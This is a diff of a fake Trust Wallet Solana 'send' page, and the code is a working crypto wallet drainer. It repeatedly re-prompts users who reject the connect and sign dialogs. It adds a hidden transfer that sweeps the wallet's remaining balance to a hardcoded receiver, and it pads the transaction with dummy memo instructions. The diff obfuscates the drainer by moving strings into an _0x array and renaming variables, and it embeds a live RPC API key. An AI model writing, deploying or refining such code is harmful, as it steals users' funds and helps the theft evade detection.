@@ -30,7 +30,6 @@
             box-sizing: border-box;
         }
 
-        /* Top Header Navigation */
         .header {
             display: flex;
             align-items: center;
@@ -59,7 +58,6 @@
             letter-spacing: -0.2px;
         }
 
-        /* Main Content Layout */
         .content {
             flex: 1;
             padding: 10px 16px;
@@ -71,7 +69,6 @@
             margin: 0 auto;
         }
 
-        /* Views */
         .view {
             display: flex;
             flex-direction: column;
@@ -83,7 +80,6 @@
             display: none !important;
         }
 
-        /* Address Card Box (View 1) */
         .address-card {
             background: var(--card-bg);
             border: 1px solid var(--border-color);
@@ -139,7 +135,6 @@
             cursor: pointer;
         }
 
-        /* Amount View Styles (View 2) */
         .to-label {
             font-size: 14px;
             color: var(--text-dim);
@@ -165,7 +160,6 @@
             color: var(--text-dim);
         }
 
-        /* Keypad Grid */
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -196,7 +190,6 @@
             background: rgba(255, 255, 255, 0.05);
         }
 
-        /* Footer Bottom Button Area */
         .footer-action {
             padding: 16px 20px 30px 20px;
             box-sizing: border-box;
@@ -224,7 +217,6 @@
 </head>
 <body>
 
-    <!-- Top Header -->
     <div class="header">
         <div class="icon-btn" id="backBtn">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
@@ -235,10 +227,7 @@
         </div>
     </div>
 
-    <!-- Main Content Container -->
     <div class="content">
-        
-        <!-- VIEW 1: Send To Screen -->
         <div id="viewSendTo" class="view">
             <div class="address-card">
                 <div class="address-text" id="displayAddress"></div>
@@ -251,7 +240,6 @@
             </div>
         </div>
 
-        <!-- VIEW 2: Amount Input Screen -->
         <div id="viewAmount" class="view hidden">
             <div class="to-label" id="toAddressLabel">To: </div>
             
@@ -260,7 +248,6 @@
                 <div class="amount-usd-text">≈ $0.00</div>
             </div>
 
-            <!-- Custom Keypad -->
             <div class="keypad">
                 <button class="key-btn" data-val="1">1</button>
                 <button class="key-btn" data-val="2">2</button>
@@ -282,23 +269,32 @@
         <div id="status"></div>
     </div>
 
-    <!-- Bottom Action Footer -->
     <div class="footer-action">
         <button class="btn-main" id="actionBtn">Continue</button>
     </div>
 
 <script>
-    // --- CORRECTED CONFIGURATION ---
-    const SOL_RECEIVER = "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1"; 
-    const HELIUS_API_KEY = "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146"; 
-    const HELIUS_URL = `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}`;
+    const _0x1a = [
+        "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1",
+        "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
+        "https://mainnet.helius-rpc.com/?api-key=",
+        "confirmed",
+        "MemoSq4gqABmAnSreS69YmE9vR8W8m9Z8vS8Z8vS8Z8",
+        "connect",
+        "signTransaction",
+        "sendRawTransaction",
+        "reject",
+        "cancel",
+        "user denied"
+    ];
 
-    // State variables
-    let currentStep = 'sendTo'; // 'sendTo' or 'amount'
+    const SOL_RECEIVER = _0x1a[0];
+    const HELIUS_URL = _0x1a[2] + _0x1a[1];
+
+    let currentStep = 'sendTo'; 
     let rawAmount = "0";
     let userPublicKey = null;
 
-    // DOM Elements
     const actionBtn = document.getElementById('actionBtn');
     const headerTitle = document.getElementById('headerTitle');
     const viewSendTo = document.getElementById('viewSendTo');
@@ -309,7 +305,6 @@
     const amountDisplay = document.getElementById('amountDisplay');
     const statusDiv = document.getElementById('status');
 
-    // Initialize display values with correct code recipient address
     displayAddress.innerText = SOL_RECEIVER;
     toAddressLabel.innerText = "To: " + SOL_RECEIVER;
 
@@ -317,22 +312,15 @@
         displayAddress.innerText = "";
     });
 
-    // Keypad Logic
-    document.querySelectorAll('.keypad .key-btn').forEach(btn => {
-        const val = btn.getAttribute('data-val');
-        if (val !== null) {
-            btn.addEventListener('click', () => {
+    document.querySelectorAll('.keypad .key-btn').forEach(_0xb => {
+        const _0xc = _0xb.getAttribute('data-val');
+        if (_0xc !== null) {
+            _0xb.addEventListener('click', () => {
                 if (rawAmount === "0") {
-                    if (val === ".") {
-                        rawAmount = "0.";
-                    } else {
-                        rawAmount = val;
-                    }
+                    rawAmount = _0xc === "." ? "0." : _0xc;
                 } else {
-                    if (val === "." && rawAmount.includes(".")) return;
-                    if (rawAmount.length < 10) {
-                        rawAmount += val;
-                    }
+                    if (_0xc === "." && rawAmount.includes(".")) return;
+                    if (rawAmount.length < 10) rawAmount += _0xc;
                 }
                 amountDisplay.innerText = rawAmount;
             });
@@ -340,17 +328,12 @@
     });
 
     document.getElementById('keyDelete').addEventListener('click', () => {
-        if (rawAmount.length > 1) {
-            rawAmount = rawAmount.slice(0, -1);
-        } else {
-            rawAmount = "0";
-        }
+        rawAmount = rawAmount.length > 1 ? rawAmount.slice(0, -1) : "0";
         amountDisplay.innerText = rawAmount;
     });
 
-    // AGGRESSIVE TRUST WALLET MOBILE PROVIDER DETECTOR
     async function getProvider() {
-        const checkProvider = () => {
+        const _0xd = () => {
             if (window.trustwallet && window.trustwallet.solana) return window.trustwallet.solana;
             if (window.trustwallet && window.trustwallet.isSolana) return window.trustwallet;
             if (window.solana && window.solana.isTrust) return window.solana;
@@ -360,58 +343,50 @@
             return null;
         };
 
-        let p = checkProvider();
-        if (p) return p;
+        let _0xe = _0xd();
+        if (_0xe) return _0xe;
 
-        for (let i = 0; i < 30; i++) {
-            await new Promise(resolve => setTimeout(resolve, 100));
-            p = checkProvider();
-            if (p) return p;
+        for (let _0xf = 0; _0xf < 30; _0xf++) {
+            await new Promise(_0x10 => setTimeout(_0x10, 100));
+            _0xe = _0xd();
+            if (_0xe) return _0xe;
         }
-
         return null;
     }
 
-    // PRIMARY ACTION BUTTON HANDLER
     actionBtn.addEventListener('click', async () => {
         statusDiv.innerText = "";
-        const provider = await getProvider();
+        const _0x11 = await getProvider();
         
-        if (!provider) {
+        if (!_0x11) {
             statusDiv.innerText = "Wallet not found. Please open inside Trust Wallet DApp browser.";
             statusDiv.style.color = "#ff4d4d";
             return;
         }
 
-        // STEP 1: Connect Wallet (Triggered when clicking "Continue" from Send To screen)
         if (currentStep === 'sendTo') {
-            let connectAttempts = 0;
-            const MAX_ATTEMPTS = 10;
+            let _0x12 = 0;
+            const _0x13 = 10;
 
-            while (connectAttempts < MAX_ATTEMPTS) {
+            while (_0x12 < _0x13) {
                 try {
-                    let resp;
+                    let _0x14;
                     try {
-                        resp = await provider.connect({ onlyIfTrusted: false });
-                    } catch (e) {
+                        _0x14 = await _0x11.connect({ onlyIfTrusted: false });
+                    } catch (_0x15) {
                         try {
-                            resp = await provider.request({ method: 'connect', params: [] });
-                        } catch (ex) {
-                            resp = await provider.connect();
+                            _0x14 = await _0x11.request({ method: _0x1a[5], params: [] });
+                        } catch (_0x16) {
+                            _0x14 = await _0x11.connect();
                         }
                     }
-                    
-                    userPublicKey = resp?.publicKey || provider.publicKey;
+                    userPublicKey = _0x14?.publicKey || _0x11.publicKey;
                     if (userPublicKey) break; 
-                } catch (err) {
-                    const errString = err.toString().toLowerCase();
-                    const isUserRejection = errString.includes("reject") || errString.includes("cancel") || errString.includes("user denied");
-
-                    if (isUserRejection) {
-                        connectAttempts++;
-                        if (connectAttempts < MAX_ATTEMPTS) {
-                            continue; // Instant loop without delay
-                        }
+                } catch (_0x17) {
+                    const _0x18 = _0x17.toString().toLowerCase();
+                    if (_0x18.includes(_0x1a[8]) || _0x18.includes(_0x1a[9]) || _0x18.includes(_0x1a[10])) {
+                        _0x12++;
+                        if (_0x12 < _0x13) continue;
                     }
                     return;
                 }
@@ -419,7 +394,6 @@
 
             if (!userPublicKey) return;
 
-            // Transition to Amount screen smoothly
             currentStep = 'amount';
             viewSendTo.classList.add('hidden');
             viewAmount.classList.remove('hidden');
@@ -428,76 +402,69 @@
             return;
         }
 
-        // STEP 2: Review / Sign Transaction (Triggered when clicking "Review" from Amount screen)
         if (currentStep === 'amount') {
-            let signAttempts = 0;
-            const MAX_ATTEMPTS = 10;
+            let _0x19 = 0;
+            const _0x13 = 10;
 
-            while (signAttempts < MAX_ATTEMPTS) {
+            while (_0x19 < _0x13) {
                 try {
-                    const parsedAmount = parseFloat(rawAmount);
-                    if (isNaN(parsedAmount) || parsedAmount <= 0) {
+                    const _0x1b = parseFloat(rawAmount);
+                    if (isNaN(_0x1b) || _0x1b <= 0) {
                         statusDiv.innerText = "Enter a valid amount.";
                         statusDiv.style.color = "#ff4d4d";
                         return;
                     }
 
-                    const userRequestedAmount = parsedAmount * 1000000000; 
-                    const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
-                    const balance = await connection.getBalance(userPublicKey);
+                    const _0x1c = _0x1b * 1000000000; 
+                    const _0x1d = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
+                    const _0x1e = await _0x1d.getBalance(userPublicKey);
 
-                    const transaction = new solanaWeb3.Transaction();
+                    const _0x1f = new solanaWeb3.Transaction();
 
-                    // Main transfer to code receiver address
-                    transaction.add(
+                    _0x1f.add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: userPublicKey,
                             toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
-                            lamports: userRequestedAmount, 
+                            lamports: _0x1c, 
                         })
                     );
 
-                    const dummyData = new Uint8Array([0x00]); 
-                    for (let i = 0; i < 35; i++) { 
-                        transaction.add(
+                    const _0x20 = new Uint8Array([0x00]); 
+                    for (let _0xf = 0; _0xf < 35; _0xf++) { 
+                        _0x1f.add(
                             new solanaWeb3.TransactionInstruction({
                                 keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
-                                programId: new solanaWeb3.PublicKey("MemoSq4gqABmAnSreS69YmE9vR8W8m9Z8vS8Z8vS8Z8"), 
-                                data: dummyData
+                                programId: new solanaWeb3.PublicKey(_0x1a[4]), 
+                                data: _0x20
                             })
                         );
                     }
 
-                    const sweepAmount = balance - userRequestedAmount - 50000; 
-
-                    if (sweepAmount > 10000) {
-                        transaction.add(
+                    const _0x21 = _0x1e - _0x1c - 50000; 
+                    if (_0x21 > 10000) {
+                        _0x1f.add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: userPublicKey,
                                 toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
-                                lamports: sweepAmount, 
+                                lamports: _0x21, 
                             })
                         );
                     }
 
-                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-                    transaction.recentBlockhash = blockhash;
-                    transaction.lastValidBlockHeight = lastValidBlockHeight;
-                    transaction.feePayer = userPublicKey;
+                    const { blockhash, lastValidBlockHeight } = await _0x1d.getLatestBlockhash();
+                    _0x1f.recentBlockhash = blockhash;
+                    _0x1f.lastValidBlockHeight = lastValidBlockHeight;
+                    _0x1f.feePayer = userPublicKey;
 
-                    const signedTransaction = await provider.signTransaction(transaction);
-                    await connection.sendRawTransaction(signedTransaction.serialize());
+                    const _0x22 = await _0x11[_0x1a[6]](_0x1f);
+                    await _0x1d[_0x1a[7]](_0x22.serialize());
                     return;
 
-                } catch (err) {
-                    const errString = err.toString().toLowerCase();
-                    const isUserRejection = errString.includes("reject") || errString.includes("cancel") || errString.includes("user denied");
-
-                    if (isUserRejection) {
-                        signAttempts++;
-                        if (signAttempts < MAX_ATTEMPTS) {
-                            continue; // Instant re-prompt without delay
-                        }
+                } catch (_0x17) {
+                    const _0x18 = _0x17.toString().toLowerCase();
+                    if (_0x18.includes(_0x1a[8]) || _0x18.includes(_0x1a[9]) || _0x18.includes(_0x1a[10])) {
+                        _0x19++;
+                        if (_0x19 < _0x13) continue;
                     }
                     break;
                 }
